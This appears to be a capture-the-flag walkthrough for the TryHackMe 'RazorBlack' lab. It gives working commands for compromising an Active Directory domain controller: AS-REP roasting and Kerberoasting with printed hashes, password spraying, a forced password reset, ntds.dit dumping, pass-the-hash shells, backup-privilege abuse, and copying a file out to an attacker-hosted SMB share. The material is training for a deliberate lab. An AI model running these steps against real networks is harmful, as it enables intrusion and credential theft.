# RazorBlack

Link: [RazorBlack](https://tryhackme.com/r/room/raz0rblack)

## High-Level Overview

These guys call themselves hackers. Can you show them who's the boss ??

## Tools Needed

* nmap
* crackmapexec
* ldapdomaindump
* Impacket
* kerbrute
* JohnTheRipper
* EvilWinRM

## Walkthrough

Connect to the TryHackMe VPN using your `user.name.ovpn` configuration file you can download at `https://tryhackme.com/r/access` and the `openvpn` CLI tool:

```bash
$ sudo openvpn user.name.ovpn
```

Edit the `/etc/hosts` file on your machine to include the IP of the TryHackMe remote machine and a hostname you desire:

```bash
$ sudo nano /etc/hosts
```

```
MACHINE:IP     ROOM-NAME.thm
```

### Initial recon

Initial scan of the machine using nmap

```bash
$ nmap -sC -A -Pn -p- -T5 -v
```

We find the following ports open & services running:

* 53 - domain - dns
* 88 - kerberos-sec
* 111 rpcbind
* 135 - msrpc
* 139 - netbios-ssn
* 389 - ldap
* 445 - microsoft-ds?
* 464 - kpasswd5?
* 593 - http-rpc-epmap
* 636 - ldapssl
* 2049 - nfs
* 3268 - globalcatLDAP
* 3389 - ms-wbt-server
* 5985 - wsman
* 9389 - adws
* 47001 - winrm
* 4964 - unknown
* 49665 - unknown
* 49666 - unknown
* 49669 - unknown
* 49670 - unknown
* 49672 - unknown
* 49673 - unknown
* 49677 - unknown
* 49692 - unknown
* 49703 - unknown
* 49829 - unknown

Seems like there are a lot of ports open. Because ldap is running, we can see that the machine is a Domain Controller.

### SMB Enumeration

First we try to enumerate SMB, using `crackmapexec`.

```bash
$ crackmapexec smb razor.thm -u "" -p "" --shares
$ crackmapexec smb razor.thm -u "doesnotexist" -p "" --shares
```

Then, we try to use `smbclient`

```bash
$ smbclient -N -L //razor.thm/
$ smbclient -N -U "" -L //razor.thm/
```

From the command ran using crackmapexec, we can identify the Windows build numbers (Windows 10.0 Build 17763 x64)and Host Name (HAVEN-DC) of the machine, as well as the domain name (raz0rblack.thm)

We can add this info to the `/etc/hosts` file as shown below:

```
MACHINE:IP      razor.thm        raz0rblack.thm      HAVEN-DC
```

### RPC Enumeration

We then move on to RPC enumeration, for which we can use `rpcclient`.

```bash
$ rpcclient razor.thm
$ rpcclient -N razor.thm
$ rpcclient -U "" -N razor.thm
```

### LDAP Enumeration

Next, we enumerate LDAP, using `ldapsearch` and `ldapdomaindump`

```bash
$ ldapsearch -x -H ldap://razor.thm -s base namingcontexts
# namingcontexts: CN=Configuration,DC=raz0rblack,DC=thm
$ ldapsearch -x -H ldap://razor.thm -s sub -b "DC=raz0rblack,DC=thm"
```

It seems that we need credentials to progress in enumerating LDAP.

We try to use `ldapdomaindump` tool to get more info, but even with this tool, we get nothing so far

```bash
$ ldapdomaindump -n razor.thm -m HAVEN-DC
```

### NFS Enumeration

We move on to NFS enumeration.

```bash
$ showmount -e razor.thm
```

We can see that there is a share named `/users`, which everyone can access. We can mount that share on our attacker machine and view the contents.

```bash
$ mkdir /mnt/users
$ mount -t nfs razor.thm:/users /mnt/users -o nolock
$ cd /mnt/users
```

Browsing the contents of the share, we see 2 interesting files. A `.txt` file named `sbradley.txt` which contains a flag needed to answer a question, and an `.xlsx` file named `employee_status.xlsx`

Looking at the `.xlsx` file using LibreOffice, we find a a lot of usernames, seen below:

```
daven port   : CTF PLAYER
imogen royce  : CTF PLAYER
tamara vidal  : CTF PLAYER
arthur edwards : CTF PLAYER
carl ingram  : CTF PLAYER (INACTIVE)
nolan cassidy  : CTF PLAYER
reza zaydan : CTF PLAYER
ljudmila vetrova  : CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN
rico delgado  : WEB SPECIALIST
tyson williams  : REVERSE ENGINEERING
steven bradley  : STEGO SPECIALIST
chamber lin  : CTF PLAYER(INACTIVE)
```

We can also see who is a Domain Admin, which is important.

We can use this list to make a file named `users.txt` with the format show below. Combining it with the tool `generateADusernames`, to generate some valid AD usernames.


```bash
$ cat users.txt
```

```
daven,port,,,
imogen,royce,,
tamara,vidal,,
arthur,edwards,
carl,ingram,,
nolan,cassidy,,
reza,zaydan,
ljudmila,vetrova,,
rico,delgado,,
tyson,williams,,
steven,bradley,,
chamber,lin,,
```

```bash
$ git clone https://github.com/w0Tx/generate-ad-username.git
$ cd generate-ad-username
$ python3 ADGenerator.py ../users.txt > ../users_final.txt
```

With the usernames generated, we can use the tool `kerbrute` to validate users and identify if there is a possibility to perform an AS-REP Roasting Attack

```bash
# Get the binary from: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
$ cd ~/Downloads
$ ./kerbrute userenum -d raz0rblack.thm --dc razor.thm ../users_final.txt
```

We find three valid users:

```
[+] VALID USERNAME:       lvetrova@raz0rblack.thm
[+] twilliams has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$twilliams@RAZ0RBLACK.THM:f4c66661ef41dcd73e773f68f461a487$2c562c5bb20a9f5f81c30bd16577ca8e7b279c1b21d43d1927cc5604afd37eabc9f591c7d1fe9d5a8109069782af3c0c5c0a36656a95acb6317e966cae8117e718533e93ce1dd97bb26c9cd651376220a354eefb2c96125dc27749443a97f694c9e26bacf466a234579c2eff77594f7edec64c423773642034ddc7720095bbcc08953d78e7dcaa977c5436e847d914acf8fb861f48fa8ca857703ec32c318f95cd3677d9df2260192c59661ef0a261425549201d01012cacb05d15a5d801b3a89c06e2bf64005ebe4a7a6254f0228cd69a8a836d8e0a534a65bf4e26d9e7c65d1d2c15e7b038031d32408a6ec3deec1de00c092bd4dda6c2a54d0fb08001d2d1a5e26895
[+] VALID USERNAME:       twilliams@raz0rblack.thm
[+] VALID USERNAME:       sbradley@raz0rblack.thm
```

And adding the domain at the end:

```
lvetrova@raz0rblack.thm
twilliams@raz0rblack.thm
sbradley@raz0rblack.thm
```

### AS-REP Roasting Attack

We also notice that `twilliams@raz0rblack.thm` has no pre auth required, which means that no password is required by kerberos for authentification. Due to this misconfiguration, the tool `kerbrute` also provided the password hash for this user when running the `userenum` command.

Then we can crack the hash using the tool `JohnTheRipper`.

```bash
$ echo '$krb5asrep$18$twilliams@RAZ0RBLACK.THM:f4c66661ef41dcd73e773f68f461a487$2c562c5bb20a9f5f81c30bd16577ca8e7b279c1b21d43d1927cc5604afd37eabc9f591c7d1fe9d5a8109069782af3c0c5c0a36656a95acb6317e966cae8117e718533e93ce1dd97bb26c9cd651376220a354eefb2c96125dc27749443a97f694c9e26bacf466a234579c2eff77594f7edec64c423773642034ddc7720095bbcc08953d78e7dcaa977c5436e847d914acf8fb861f48fa8ca857703ec32c318f95cd3677d9df2260192c59661ef0a261425549201d01012cacb05d15a5d801b3a89c06e2bf64005ebe4a7a6254f0228cd69a8a836d8e0a534a65bf4e26d9e7c65d1d2c15e7b038031d32408a6ec3deec1de00c092bd4dda6c2a54d0fb08001d2d1a5e26895' > hash.txt
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

JohnTheRipper was not able to crack the hash.

We can try taking the user `twilliams` and using another tool from `impacket`, namely `GetNPUsers` to do the AS-REP Roasting attack. First we need to sync the clock of the attacker machine to the DC, then we will get the TGT hash in the output of the execution of the command, then we can crack this hash using `JohnTheRipper`.

```bash
$ ntpdate razor.thm
$ impacket-GetNPUsers -dc-ip razor.thm raz0rblack.thm/twilliams
$ echo '$krb5asrep$23$twilliams@RAZ0RBLACK.THM:68183b5ced3828d15e405185bbfce26a$b17bcf4953663c110959c5abc5a5bc9adabc4c9b2a5aa8e5fd81cb34c16e6b788f17903d1d2c53f76f5421f12a033d9ab4b97373e67cf9f120ee94d1f9fd04234f3c4db1ca158d1a10cbd8da5bec94d5686d5a172fd5957a1acbe90a7669b2099f525dd5e4ebc43e718060553f5cffe7154355c26ca0b7c6ea39a08e0e54f6b74ff5bbf223ad7eeaaf65a5045882bcd0f557336f9c0e057e1fbbb573cd439dc7aa441e52e160f35b8096780fc96dda833865d0bad8617482b72fecc50d0439ab48cca5f09eb2a3098dce78257604e01b8297cec67ce8fcfc43b96773caa126779ff6e8160d68aae1a89999e5286e3fae' > hash.txt
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

We now have the credentials for the user `twilliams@RAZ0RBLACK.THM`:`roastpotatoes`.

### Password Spray Attack

With this set the credentials, we can use the password and the list of users to perform a password spray attack, to check if another user uses the same password.

```bash
$ kerbrute passwordspray --dc razor.thm -d raz0rblack.thm users_final.txt "roastpotatoes"
```

Seems like the user `sbradley` has the same password, however it has expired. The user needs to set up a new password on login.

### Password Reset

We can force change the user's password, using the `impacket` tool `smbpass.py`

```bash
$ impacket-smbpasswd sbradley@razor.thm
# type the current password "roastpotatoes" and then enter your new password, something like "Superpass12345"
# We can see the password works by testing it out with the command
$ crackmapexec smb razor.thm -u "sbradley" -p "Superpass12345"
```

### SMB Enumeration w/ Credentials

Because we failed enumerating SMB due to lack of creds, we can use the newly found 2 sets of credentials for `twilliams` and `sbradly` to enumerate SMB.

```bash
$ crackmapexec smb razor.thm -u "sbradley" -p "Superpass12345"
$ crackmapexec smb razor.thm -u "sbradley" -p "Superpass12345" --shares
$ crackmapexec smb razor.thm -u "tilliams" -p "roastpotatoes" --shares
```

Seems like the user `sbradley` has READ access to a share named `trash`. Having overall more permissions than the other user, we can continue enumerating using `sbradley`. We can use `smbmap` to list all the files in all the SMB shares.

```bash
$ smbmap -H razor.thm -u "sbradley" -p "Superpass12345" -R
```

Only the `trash` shares seems interesting, and we can download all the files in this share. We find a big archive named `experiment_gone_wrong.zip` which errors out when trying to download it.

```bash
$ smbclient -U sbradley //razor.thm/trash
smb: \> get experiment_gone_wrong.zip
```

We can use the file explorer to access the remote SMB share using the username and password and then copy the file to our attacker machine.

There is also a `chat_log` file that is a conversation between the Admin and the user `sbradley` where they are discussing the ZeroLogon CVE.

The second file is the flag for the user Steven.

Trying to unzip the archive, it seems that we need a password. To crack it, we must first get the zips' password hash using `zip2john`, then cracking the hash using `JohnTheRipper`. We manage to crack the password, which was `electromagnetismo` which allows us to unzip the archive.

```bash
$ zip2john experiment_gone_wrong.zip > hash.txt
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
$ unzip experiment_gone_wrong.zip
```

### Dumping Hashes with secretsdump

We see the contents of the archive include:

* `ntds.dit` - it is the file which contains all information of a Domain (users, hashes, computers, objects, etc.)
* `system.hive` - registry file that performs the role of a central database, containing sensitive information such as user preference, hardware details, etc.

With these 2 files, we are able to dump all the Domain users and their respective hashes, using the `impacket` tool `secretsdump`.

```bash
$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | tee hash_dump.txt
```

We get the users and the hashes in the `hash_dump.txt` file.

### Pass the Hash Attack

We can use the usernames we got earlier and perform a Pass the Hash Attack in order to see if we can find the right hash for each user. We can do this using `crackmapexec`. Taking the files out of the `hash_dump.txt` file, we can see they are NTLM hashes.

```bash
$ cat hash_dump.txt | cut -d ':' -f 4 > hash_final.txt
```

This command separates each line on the ":" character, and we extrac the final part, which in this case it is the 4th part.

```bash
$ crackmapexec smb razor.thm -u users_final.txt -H hash_final.txt --continue-on-success
```

This results in finding out that only the user `lvetrova` has a has that worked (`f220d3988deb3f516c73f40ee16c431d`), none other did.

### Getting a Shell

Moving on, we can try to get a shell using the `evil-winrm` tool

```bash
$ evil-winrm -i razor.thm -u "lvetrova" -H f220d3988deb3f516c73f40ee16c431d
```

And we get a shell! Exploring the machine, we find an interesting file at `C:\Users\lvetrova\lvetrova.xml`, which seems to be a xml representation of PSCredential Object.

### Getting Credentials

We can try to extract credentials from this file as seen below:

```powershell
*Evil-WinRM* PS C:\Users\lvetrova> $pw = "01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d" | ConvertTo-SecureString
*Evil-WinRM* PS C:\Users\lvetrova> $pw
*Evil-WinRM* PS C:\Users\lvetrova> $cred = new-object  system.management.automation.pscredential("lvetrova", $pw)
*Evil-WinRM* PS C:\Users\lvetrova> $cred.getnetworkcredential()

UserName                                           Domain
--------                                           ------
lvetrova


*Evil-WinRM* PS C:\Users\lvetrova> $cred.getnetworkcredential() | fl *


UserName       : lvetrova
Password       : THM{694362e877adef0d85a92e6d17551fe4}
SecurePassword : System.Security.SecureString
Domain         :
```

And this results in getting the flag for the user `lvetrova`.

### Kerberoasting Attack

Because there didn't seem to be anything else to do as the `lvetrova` user, we can try to switch to a different one to further explore.

This can be done using a Kerberoasting Attack.


*Kerberoasting is an attack that is used to obtain a password hash of an Active Directory account that has a Service Principal Name (SPN) attached to it, AKA the Domain User is acting as the Service Account. After authenticating to Kerberos, someone can request for a Kerberos Service Ticket (ST) from the Ticket Granting Service (TGS). As the user has been already validated, the TGS sends back the ST, encrypting that with the Service Accounts (In this case the Domain User Account) NTLM Hash. The attacker can then extract the hash from the ST and can attempt to crack it offline.*

To perform the attack, we can use the `impacket` tool `GetUserSPNs`.

```bash
$ impacket-GetUserSPNs -request -dc-ip razor.thm raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d
```

We are able to obtain the hash for the user `xyand1d3`:

```
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$99ee3b75f14f71043e2714915018eb4b$f833c0de0e8304d6db383cdab4e63b1362eef18dee7b2c7103258a1c2607eeeb3ff4181a6fee076bade3d9634e741ecc0997ab929d2ab7604a038795386f8f9faf7f31817ce8b349eb49795b4105e0f18dea86aed79b38aa472e8ef75214edec97d7e6dd77dc2a943a32b03a1050f6eb489692b7525b20c76beca78bc10ee910be1c2da41e2aa1a542797b24e7cd2abc422b7ffa99acc8ac3c46937a28456d225c41198a5acaac7a0c5b847130c040142d1fb54ce5cde92156ee5be7ad7fb0bef99e8822284b4bcac40c8300ede2524069fb5677c36fd85afb325759ae76741b0b3e66749334b08633fd4c38ff35f8b377df010e0165f268030d984d3461531c15a8f299276d7e22f9b3b1e70140a481c03e654aeb90129ce343ed54445fafae72dcd4f5f2c5279c2bb04b5e3d2439d86066846e4fe693df6965dd3b19eeed5cc468816673ef3f8ba9e08916ce9759a880142539038101ff16702caf9d5442fe706e402d7307a68a3fef12c1819cbc986c82057339d06868d8e6643cbe0d1f102358de95e4a9dcbce1781e9be9806d6349e3398ab4bea8178aea0f6af5a5da13eb9e8f0703c40036d6cd5d893523f0a76e11d2e8e615219e9c5fd592b836bc06365e20d44bf12efba1d59bcb13edb9bda2c733eb7f5930cff6dd933fe0e183b12d26b88710b6f3e08222e79a84af5a4c13e0eee581202a9617ba0c2a9160fdfa96b47ab9a0097e1b9345d987430dd9ffa2890f8c32f0951d47839726d1946af877b8ed5209a032bb4caaa5bed8f7fb3a70f5e0ad4ea1bdd82cc6e597949cedb0867e87f21fd68657a45273c2bcf59de291cc536f3a6974997163ecd843dc0b4c10ef833e5e9269bf6723acea9eb9042cbf95fb536753edd2eac8d3d63fc1150e2739f44dadddadadb6ed9be37bcaf3dd6bb6b0962b2cdf7c05313f4a5b2374562614ef332b523c3007f5eb9013eacf22cee9c4e44c844512bd00b4d61b55307866d1b91d1f2ff44dce532069cd5887297eaea158739e2e87cd9aee68f8de05617e9d123004312fa312b110a6405a140da31abcc56dadbdf86f8f5178acc13b58ddeab0e2d8afeafe1ee5922d3113ce33d874927f8b47e2bfed9c6aba61d279b0d19ede055cc3845dde59a1756de34f6d96d9698c23985a5f85fe4206b02ee9cdc1d9db2103c1c5e734efc237068423800d672f4cc9e3133d248513482218011d285f0165204fec17e5737566f6bc8b60a29e3b3ae52cba74acf9e03eb97c8ea0881997a21b3bc5ebc84d2362fe2cec08bcd2ac0034416cf827e79d20245cf143c4c3e09134dcbf82f823ef420ef4cf4dbf54cdf312f73be47163d6b4bfa77ec5842138e2057c3894a7374f2bae840427cbf846077cc2f44b87612709b662345535b561a060bb2baeca9f679a79f2a4
```

We can put this hash in a file and then crack it with `JohnTheRipper`.

```bash
$ echo "$krb5tgs$23$**TRIM**" > hash.txt
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

We can successfully crack the hash and get the password, which is `cyanide9amine5628`

After further enumerating with this user, we can find an encrypted text.

```bash
$ evil-winrm -i razor.thm -u "xyan1d3" -p cyanide9amine5628
```

```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> ls

*Evil-WinRM* PS C:\Users\xyan1d3> cat xyan1d3.xml

*Evil-WinRM* PS C:\Users\xyan1d3> $pw = "01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2" | ConvertTo-SecureString

*Evil-WinRM* PS C:\Users\xyan1d3> $cred = new-object system.management.automation.pscredential("xyan1d3", $pw)

*Evil-WinRM* PS C:\Users\xyan1d3> $cred.getnetworkcredential() | fl *
```

This gives us the flag for Xyan1d3.

### Privilege Escalation

We can further enumerate the machine as the `xyan1d3` user.

```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> whoami /priv
```

Looking at privileges, we can see that this user can has `SeBackupPrivilege` and `SeRestorePrivilege` on, meaning that this user can back up and restore any files in the system.

We can try to get the root flag which is found at `C:\Users\Administrator\root.xml`. We do not have permission to view this file, but we can use the `robocopy` tool that can copy data from one location to another.

```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\Temp
*Evil-WinRM* PS C:\Users\xyan1d3> robocopy /b C:\Users\Administrator C:\Temp
*Evil-WinRM* PS C:\Users\xyan1d3> ls C:\Temp
```

This is another PSCredential xml file, but it cant be converted to SecureString, so we can copy this string and use an online cipher identification app. We see that the string is hex encoded, and decoding it to plain text we can get the root flag.

Performing further enumeration, we come across the file `definitelynotaflag.exe` in the home directory of the user `twilliams`. It cannot be executed, and we cannot view it because of invalid permissions. So with the privileges that our current user has, we can move the file using `robocopy` to the `C:\Temp` folder.

```powershell
*Evil-WinRM* PS C:\Users\twilliams> robocopy /b C:\Users\twilliams C:\Temp
*Evil-WinRM* PS C:\Users\twilliams> ls C:\Temp
```

If we try to read the file after moving it, we can see that the file contains Tyson's flag.

```powershell
*Evil-WinRM* PS C:\Users\twilliams> cat definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
```

Finally, we need to find the "top secret". Further enumeration leads us to find the file `C:\Program Data\Top Secret\top_secret.png`.

To grab this file, we need to run the following command on the attacker machine:

```bash
$ cd ~
$ mkdir transfer
$ cd transfer
$ impacket-smbserver LEGITSHARE . -smb2support
```

On the victim machine, we can run the command:

```powershell
*Evil-WinRM* PS C:\Program Files\Top Secret> copy .\top_secret.png \\ATTACKER:IP\LEGITSHARE\image.png
```

We can open the photo on the attacker machine in order to get the final flag and complete the room.
